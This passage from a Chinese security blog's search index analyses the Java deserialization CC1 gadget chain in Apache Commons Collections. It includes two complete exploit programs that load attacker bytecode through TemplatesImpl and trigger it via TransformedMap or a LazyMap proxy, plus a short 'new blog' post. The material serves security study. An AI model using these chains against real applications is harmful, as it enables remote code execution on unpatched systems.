class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.TransformedMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.FileInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.FileOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.lang.annotation.Target;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Constructor;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.nio.file.Files;</span><br><span class="line"><span class="keyword">import</span> java.nio.file.Paths;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">templatesImpldynamicclass</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span><span class="keyword">throws</span> Exception &#123;</span><br><span class="line"></span><br><span class="line">        TemplatesImpl templates=<span class="keyword">new</span> <span class="title class_">TemplatesImpl</span>();</span><br><span class="line">        Class templateClass=templates.getClass();</span><br><span class="line">        Field nameField=templateClass.getDeclaredField(<span class="string">&quot;_name&quot;</span>);</span><br><span class="line">        nameField.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        nameField.set(templates,<span class="string">&quot;Meteor&quot;</span>);</span><br><span class="line"></span><br><span class="line">        Field bytecodesfield=templateClass.getDeclaredField(<span class="string">&quot;_bytecodes&quot;</span>);</span><br><span class="line">        bytecodesfield.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="type">byte</span>[] evil= Files.readAllBytes(Paths.get(<span class="string">&quot;D:\\code\\calc.class&quot;</span>));</span><br><span class="line">        <span class="type">byte</span>[][] codes=&#123;evil&#125;;</span><br><span class="line">        bytecodesfield.set(templates,codes);</span><br><span class="line"></span><br><span class="line">        Field tfactoryfield=templateClass.getDeclaredField(<span class="string">&quot;_tfactory&quot;</span>);</span><br><span class="line">        tfactoryfield.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        tfactoryfield.set(templates,<span class="keyword">new</span> <span class="title class_">TransformerFactoryImpl</span>());</span><br><span class="line"></span><br><span class="line">        Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(templates),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;newTransformer&quot;</span>, <span class="literal">null</span>, <span class="literal">null</span>)</span><br><span class="line">        &#125;;</span><br><span class="line">        ChainedTransformer chainedTransformer=<span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformers);</span><br><span class="line"><span class="comment">//        chainedTransformer.transform(1);</span></span><br><span class="line"></span><br><span class="line">        HashMap&lt;Object,Object&gt; map=<span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">        map.put(<span class="string">&quot;value&quot;</span>,<span class="string">&quot;value&quot;</span>);<span class="comment">//这里是问题二中改键值对的值为注解中成员变量的名称，通过if判断</span></span><br><span class="line">        Map&lt;Object,Object&gt; transformedmap= TransformedMap.decorate(map,<span class="literal">null</span>,chainedTransformer);</span><br><span class="line">        Class c=Class.forName(<span class="string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>);</span><br><span class="line">        Constructor constructor=c.getDeclaredConstructor(Class.class,Map.class);</span><br><span class="line">        constructor.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        Object o=constructor.newInstance(Target.class,transformedmap);<span class="comment">//这里是问题二中第一个参数改注解为Target</span></span><br><span class="line">        serialize(o);</span><br><span class="line">        unserialize(<span class="string">&quot;ser.bin&quot;</span>);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">serialize</span><span class="params">(Object object)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        ObjectOutputStream oos=<span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(<span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;ser.bin&quot;</span>));</span><br><span class="line">        oos.writeObject(object);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">unserialize</span><span class="params">(String filename)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        ObjectInputStream ois=<span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(<span class="keyword">new</span> <span class="title class_">FileInputStream</span>(filename));</span><br><span class="line">        ois.readObject();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><img src="/2024/12/26/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96CC1%E9%93%BE%E5%88%86%E6%9E%90/image-20241130150406600.png" class="" title="This is an example image"><ul><li>然后是 Yso 正版链子的 TemplatesImpl 的实现方式。</li></ul><p>EXP 如下</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.LazyMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Constructor;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.InvocationHandler;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Proxy;</span><br><span class="line"><span class="keyword">import</span> java.nio.file.Files;</span><br><span class="line"><span class="keyword">import</span> java.nio.file.Paths;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">ysotemplate</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">TemplatesImpl</span> <span class="variable">templates</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TemplatesImpl</span>();</span><br><span class="line">        <span class="type">Class</span> <span class="variable">templatesClass</span> <span class="operator">=</span> templates.getClass();</span><br><span class="line">        <span class="type">Field</span> <span class="variable">nameField</span> <span class="operator">=</span> templatesClass.getDeclaredField(<span class="string">&quot;_name&quot;</span>);</span><br><span class="line">        nameField.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        nameField.set(templates, <span class="string">&quot;Meteor&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="type">Field</span> <span class="variable">bytecodesField</span> <span class="operator">=</span> templatesClass.getDeclaredField(<span class="string">&quot;_bytecodes&quot;</span>);</span><br><span class="line">        bytecodesField.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="type">byte</span>[] evil = Files.readAllBytes(Paths.get(<span class="string">&quot;D:\\code\\calc.class&quot;</span>));</span><br><span class="line">        <span class="type">byte</span>[][] codes = &#123;evil&#125;;</span><br><span class="line">        bytecodesField.set(templates, codes);</span><br><span class="line"></span><br><span class="line">        <span class="type">Field</span> <span class="variable">tfactoryField</span> <span class="operator">=</span> templatesClass.getDeclaredField(<span class="string">&quot;_tfactory&quot;</span>);</span><br><span class="line">        tfactoryField.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        tfactoryField.set(templates, <span class="keyword">new</span> <span class="title class_">TransformerFactoryImpl</span>());</span><br><span class="line">        <span class="comment">//     templates.newTransformer();</span></span><br><span class="line">        Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(templates), <span class="comment">// 构造 setValue 的可控参数</span></span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;newTransformer&quot;</span>, <span class="literal">null</span>, <span class="literal">null</span>)</span><br><span class="line">        &#125;;</span><br><span class="line">        <span class="type">ChainedTransformer</span> <span class="variable">chainedTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformers);</span><br><span class="line">        HashMap&lt;Object, Object&gt; hashMap = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">        <span class="type">Map</span> <span class="variable">decorateMap</span> <span class="operator">=</span> LazyMap.decorate(hashMap, chainedTransformer);</span><br><span class="line"></span><br><span class="line">        <span class="type">Class</span> <span class="variable">c</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>);</span><br><span class="line">        <span class="type">Constructor</span> <span class="variable">declaredConstructor</span> <span class="operator">=</span> c.getDeclaredConstructor(Class.class, Map.class);</span><br><span class="line">        declaredConstructor.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="type">InvocationHandler</span> <span class="variable">invocationHandler</span> <span class="operator">=</span> (InvocationHandler) declaredConstructor.newInstance(Override.class, decorateMap);</span><br><span class="line"></span><br><span class="line">        <span class="type">Map</span> <span class="variable">proxyMap</span> <span class="operator">=</span> (Map) Proxy.newProxyInstance(ClassLoader.getSystemClassLoader()</span><br><span class="line">                , <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Map.class&#125;, invocationHandler);</span><br><span class="line">        invocationHandler = (InvocationHandler) declaredConstructor.newInstance(Override.class, proxyMap);</span><br><span class="line"></span><br><span class="line">        serialize(invocationHandler);</span><br><span class="line">        unserialize(<span class="string">&quot;ser.bin&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">serialize</span><span class="params">(Object obj)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">oos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(<span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;ser.bin&quot;</span>));</span><br><span class="line">        oos.writeObject(obj);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title function_">unserialize</span><span class="params">(String Filename)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException &#123;</span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">ois</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(<span class="keyword">new</span> <span class="title class_">FileInputStream</span>(Filename));</span><br><span class="line">        <span class="type">Object</span> <span class="variable">obj</span> <span class="operator">=</span> ois.readObject();</span><br><span class="line">        <span class="keyword">return</span> obj;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><img src="/2024/12/26/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96CC1%E9%93%BE%E5%88%86%E6%9E%90/image-20241130150715540.png" class="" title="This is an example image">]]></content>
      
      
      <categories>
          
          <category> Web安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Java安全 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>新博客啦啦啦</title>
      <link href="/2024/12/26/hello-world/"/>
      <url>/2024/12/26/hello-world/</url>
      
        <content type="html"><![CDATA[<p>欢迎来到Meteor_Kai的暗黑系博客，一直觉得很帅，今天也是换上了，嘻嘻。</p><p>欢迎大师傅们交流哦，联系方式见About Me。</p>]]></content>
      
      
      
    </entry>
    
    
  
  
</search>
